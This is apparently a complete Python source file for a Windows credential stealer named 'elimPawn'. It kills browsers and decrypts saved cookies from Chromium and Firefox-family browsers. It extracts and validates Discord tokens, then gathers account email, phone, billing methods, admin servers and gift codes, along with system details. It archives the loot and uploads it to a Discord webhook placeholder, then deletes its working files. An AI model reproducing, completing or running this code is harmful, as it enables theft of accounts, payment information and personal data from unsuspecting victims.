############
# elimPawn #
############

import os
import re
import wmi
import sys
import json
import time
import uuid
import py7zr
import base64
import random
import psutil
import sqlite3
import platform
import requests
import subprocess
from shutil import copy2, rmtree
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

webhook = "discord webhook here"

def rand_gen():
    rand = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(7, 13)))
    return rand

localad = os.getenv("LOCALAPPDATA")
mainad = os.getenv("APPDATA")

new_dir = rand_gen()
main_path = 'C:\\Users\\Public'

try:
    rmtree(f'{main_path}\\sycillia')
except FileNotFoundError:
    pass

os.makedirs(f'{main_path}\\{new_dir}')
os.makedirs(f'{main_path}\\sycillia')

with open(f'{main_path}\\sycillia\\silence.txt', 'w', encoding='utf-8') as f:
    f.write('############\n# elimPawn #\n############\n\n\n')

print('############\n# elimPawn #\n############\n\n\n')

browser_exe = [
    "chrome.exe", "brave.exe", "vivaldi.exe", "msedge.exe", "thorium.exe", "yandex.exe", # Chromium
    "firefox.exe", "librewolf.exe", "waterfox.exe", # Firefox
    "opera.exe", # Opera
    "kometa.exe", "orbitum.exe", "centbrowser.exe", "7star.exe", "sputnik.exe", "epicprivacybrowser.exe", "uran.exe", "iridium.exe" # Misc
]

browsers = {
    'google-chrome-sxs': localad + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': localad + '\\Google\\Chrome\\User Data',
    'brave': localad + '\\BraveSoftware\\Brave-Browser\\User Data',
    'vivaldi': localad + '\\Vivaldi\\User Data',
    'microsoft-edge': localad + '\\Microsoft\\Edge\\User Data',
    'thorium': localad + '\\Thorium\\User Data',
    'yandex': localad + '\\Yandex\\YandexBrowser\\User Data',
    'firefox': mainad + '\\Mozilla\\Firefox\\Profiles',
    'librewolf': mainad + '\\Librewolf\\Profiles',
    'waterfox': mainad + '\\Waterfox\\Profiles',
    'opera': mainad + '\\Opera Software\\Opera Stable',
    'opera-gx': mainad + '\\Opera Software\\Opera GX Stable',
    'kometa': localad + '\\Kometa\\User Data',
    'orbitum': localad + '\\Orbitum\\User Data',
    'cent-browser': localad + '\\CentBrowser\\User Data',
    '7star': localad + '\\7Star\\7Star\\User Data',
    'sputnik': localad + '\\Sputnik\\Sputnik\\User Data',
    'epic-privacy-browser': localad + '\\Epic Privacy Browser\\User Data',
    'uran': localad + '\\uCozMedia\\Uran\\User Data',
    'iridium': localad + '\\Iridium\\User Data',
    'amigo': localad + '\\Kometa\\User Data'
}

chromium_profiles = [
    'Default',
    'Profile 1',
    'Profile 2',
    'Profile 3',
    'Profile 4',
    'Profile 5'
]

discords = {
    'discord': mainad + '\\discord\\Local Storage\\leveldb\\',
    'discord-ptb': mainad + '\\discordptb\\Local Storage\\leveldb\\',
    'discord-canary': mainad + '\\discordcanary\\Local Storage\\leveldb\\',
    'lightcord': mainad + '\\Lightcord\\Local Storage\\leveldb\\',
}

nitro_types = {
    0: 'None',
    1: 'Nitro Classic',
    2: 'Nitro',
    3: 'Nitro Basic'
}

billing_methods = {
    1: 'Credit Card',
    2: 'PayPal'
}

base_url = 'https://discord.com/api/v9/users/@me'
regexp = r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
regexp_enc = r'dQw4w9WgXcQ:[^\"]*'
tokens, uids = [], []

def pre_grab():
    for exe in browser_exe:
        for proc in psutil.process_iter():        
            if proc.name() == exe:
                print(f'--==+ Killing {exe} +==--')
                proc.kill()

def get_profiles(browser: str, current_path: str) -> list:
    exists = []
    if browser in ['firefox', 'waterfox', 'librewolf']:
        dir_list = os.listdir(current_path)
        for profile in dir_list:
            profile_path = f'{current_path}\\{profile}'
            with open(f'{profile_path}\\times.json', 'r', encoding='utf-8') as f:
                timestamp = json.load(f)
            if timestamp.get('firstUse') is not None:
                exists.append(profile)
    else:
        for profile in chromium_profiles:
            profile_path = f'{current_path}\\{profile}'
            if os.path.isdir(profile_path):
                exists.append(profile)
    return exists

def get_master_key(path: str) -> str:
    try:
        if not os.path.isfile(path):
            return None
        
        with open(path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        encrypted_key = local_state['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        return master_key
    except Exception as e:
        print(f"Couldn't retrieve master key: {e}")
        return None

def grab_cookies():
    for name, path in browsers.items():
        if not os.path.isdir(path):
            continue
        master_key = get_master_key(f'{path}\\Local State')
        profiles = get_profiles(name, path)

        for profile in profiles:
            cookies(name, path, profile, master_key)

def decrypt(buf: bytes, master_key: bytes) -> str:
    try:
        if buf[:3] == b'v10' or buf[:3] == b'v11':
            iv = buf[3:15]
            payload = buf[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            decrypted = decrypted[:-16].decode()
            return decrypted
        else:
            return ""
    except Exception as e:
        print(f"Decryption error: {e}")
        return ""

def decrypt_disc(buf: bytes, master_key: bytes) -> str:
    try:
        iv = buf[3:15]
        payload = buf[15:]

        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        decrypted = decrypted[:-16]

        try:
            decrypted_str = decrypted.decode('utf-8')
            print(f"--==+ Decrypted token +==--")
            return decrypted_str
        except UnicodeDecodeError:
            return decrypted.hex()

    except Exception as e:
        print(f'Decryption error: {e}')
        return ''

def cookies(name: str, path: str, profile: str, master_key: str):
    print(f'--==+ Grabbing cookies from  -  {name} +==--')
    if name in ['firefox', 'librewolf', 'waterfox']:
        copy2(f'{path}\\{profile}\\cookies.sqlite', f'{main_path}\\sycillia\\{name}_cookies_{rand_gen()}.sqlite')
        return
    
    if name in ['opera', 'opera-gx']:
        cookie_path = path + '\\Network\\Cookies'
    else:
        cookie_path = f'{path}\\{profile}\\Network\\Cookies'

    if not os.path.isfile(cookie_path):
        return
    
    copy2(cookie_path, new_dir)
    conn = sqlite3.connect(new_dir)
    cursor = conn.cursor()

    with open(f'{main_path}\\sycillia\\silence.txt', 'a', encoding='utf-8') as f:
        f.write(f'\nBrowser - {name} | Profile - {profile}\n\n\n')
        for res in cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall():
            host_key, name, path, encrypted_value, expires_utc = res
            value = decrypt(encrypted_value, master_key)
            if "" not in [host_key, name, value]:
                f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
    cursor.close()
    conn.close()
    os.remove(new_dir)
    return

def token_check(token: str) -> bool:
    r = requests.get(base_url, headers={'Authorization': token})
    if r.status_code == 200:
        return True
    return False

def get_uid(token: str) -> str:
    uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
    return uid

def grab_disc_token():
    print('--==+ Grabbing Discord tokens +==--')

    for name, path in discords.items():
        if not os.path.exists(mainad + f'\\{name}\\Local State'):
            continue

        for file_name in os.listdir(path):
            if file_name[-3:] not in ['log', 'ldb']:
                continue
            with open(f'{path}\\{file_name}', 'r', errors='ignore') as file:
                for line in [x.strip() for x in file.readlines() if x.strip()]:
                    for v in re.findall(regexp_enc, line):
                        try:
                            token_b64 = v.split('dQw4w9WgXcQ:')[1]
                            token_bytes = base64.b64decode(token_b64)
                            master_key = get_master_key(f'{mainad}\\{name}\\Local State')
                            token = decrypt_disc(token_bytes, master_key)
                            if token_check(token):
                                uid = get_uid(token)
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)
                        except Exception as e:
                            print(f'Error processing token: {e}')

def grab_disc_browser_token():
    print('--==+ Grabbing Discord tokens from browser +==--')
    for name, path in browsers.items():
        profiles = get_profiles(name, path)
        for profile in profiles:
            if name in ['firefox', 'librewolf', 'waterfox']:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if not file.endswith('.sqlite'):
                            continue
                        with open(os.path.join(root, file), errors='ignore') as f:
                            for line in [x.strip() for x in f if x.strip()]:
                                for token in re.findall(regexp, line):
                                    if token_check(token):
                                        uid = get_uid(token)
                                        if uid not in uids:
                                            tokens.append(token)
                                            uids.append(uid)

            if name in ['opera', 'opera-gx']:
                leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
            else:
                leveldb_path = os.path.join(path, profile, 'Local Storage', 'leveldb')

            if os.path.exists(leveldb_path):
                for file_name in os.listdir(leveldb_path):
                    if file_name[-3:] not in ['log', 'ldb']:
                        continue

                    with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                        for line in [x.strip() for x in f if x.strip()]:
                            for token in re.findall(regexp, line):
                                if token_check(token):
                                    uid = get_uid(token)
                                    if uid not in uids:
                                        tokens.append(token)
                                        uids.append(uid)

def grab_tokens():
    grab_disc_token()
    grab_disc_browser_token()

    if not tokens:
        return

    for token in tokens:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

        username = user['username']
        user_id = user['id']
        email = user.get('email', 'N/A')
        phone = user.get('phone', 'N/A')
        mfa = user.get('mfa_enabled', 'N/A')
        
        avatar = f'https://cdn.discordapp.com/avatars/{user_id}/{user["avatar"]}.gif'
        if requests.get(avatar).status_code != 200:
            avatar = f'https://cdn.discordapp.com/avatars/{user_id}/{user["avatar"]}.png'

        nitro = nitro_types.get(user.get('premium_type', ''), 'None')
        payment_methods = ', '.join(payment_type_map.get(method['type'], 'Unknown') for method in billing) if billing else None

        hq_guilds = []
        if guilds:
            for guild in guilds:
                admin = int(guild['permissions']) & 0x8 != 0
                if admin and guild.get('approximate_member_count', 0) >= 100:
                    owner = guild.get('owner', False)
                    
                    invites = requests.get(f'https://discord.com/api/v8/guilds/{guild["id"]}/invites', headers={'Authorization': token}).json()
                    try:
                        invite = 'https://discord.gg/' + invites[0]['code'] if invites else None
                    except KeyError:
                        invite = None

                    data = f'\n\nGuild Name: {guild["name"]} (ID: {guild["id"]})\nOwner? {owner}\n\nMembers (Offline): {guild.get("approximate_member_count", 0)}\nMembers (Online): {guild.get("approximate_presence_count", 0)}\nMembers (DnD): {guild.get("approximate_member_count", 0) - guild.get("approximate_presence_count", 0)}\n\nInvite: {invite}\n\n'
                    if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                        break
                    hq_guilds.append(data)

        hq_guilds = '\n'.join(hq_guilds) if hq_guilds else None

        codes = []
        if gift_codes:
            for code in gift_codes:
                name = code['promotion']['outbound_title']
                code_value = code['code']
                data = f"Gift: `{name}`\nCode: `{code_value}`"
                if len('\n\n'.join(codes)) + len(data) >= 1024:
                    break
                codes.append(data)
            codes = '\n\n'.join(codes) if codes else None

        with open(f'{main_path}\\sycillia\\harmony.txt', 'a', encoding='utf-8') as f:
            f.write(f'\n\nUsername: {username} ({user_id})\nEmail: {email}\nPhone Number: {phone}\nMFA: {mfa}\nToken: {token}\n\nBilling Information:\n{payment_methods}\n\nHQ Guilds (if any):\n{hq_guilds}\n\nGift Codes (if any):\n{codes}\n\n\n')


def collect_sysinfo():
    print("--==+ Collecting system information +==--")
    c = wmi.WMI()
    
    cpu = c.Win32_Processor()[0]
    mem = c.Win32_ComputerSystem()[0]
    hd = c.Win32_LogicalDisk()[0]
    video = c.Win32_VideoController()[0]
    
    raw_mac = uuid.getnode()
    mac = ':'.join(['{:02x}'.format((raw_mac >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    
    adapterquery = subprocess.check_output(['ipconfig', '/all'])
    adapters = adapterquery.decode("utf-8")
    
    with open(f'{main_path}\\sycillia\\aware.txt', 'a', encoding='utf-8') as vf:
        vf.write(f'''
############\n# elimPawn #\n############\n\n\n

### SYSINFO

Windows {platform.system()} {platform.release()} ( {platform.version()} ) {platform.win32_edition()}
64-bits? {sys.maxsize > 2**32} ( {platform.machine()} )

CPU: {cpu.name} ( {platform.processor()} )
CPU Speed: {cpu.MaxClockSpeed}
Total Physical Memory: {int(mem.TotalPhysicalMemory) // (1024*1024)} MB
Free Disk Space: {int(hd.FreeSpace) // (1024*1024)} MB

Graphics Card: {video.name}
Video Processor: {video.VideoProcessor}
Driver Date: {video.DriverDate}
Max Refresh Rate: {video.MaxRefreshRate}
Min Refresh Rate: {video.MinRefreshRate}
Video Mode Desc.: {video.VideoModeDescription}
Installed Display Drivers:
{video.InstalledDisplayDrivers}

Computer Network Name: {platform.node()}
MAC Address: {mac}
Adapters:
{adapters}

Raw Data:
HD(s): {c.Win32_LogicalDisk()}

Mem: {c.Win32_ComputerSystem()}

CPU(s): {c.Win32_Processor()}
''')


def upload_data():
    print("--==+ Sending data +==--")
    with py7zr.SevenZipFile(f'{main_path}\\sycillia.7z', 'w') as archive:
        archive.writeall(f'{main_path}\\sycillia', arcname=os.path.basename(f'{main_path}\\{new_dir}'))
    requests.post(webhook, files={'file': open(f'{main_path}\\sycillia.7z', 'rb')})





pre_grab()
grab_cookies()
grab_tokens()
collect_sysinfo()
upload_data()

rmtree(f'{main_path}\\{new_dir}')
rmtree(f'{main_path}\\sycillia')
os.remove(f'{main_path}\\sycillia.7z')

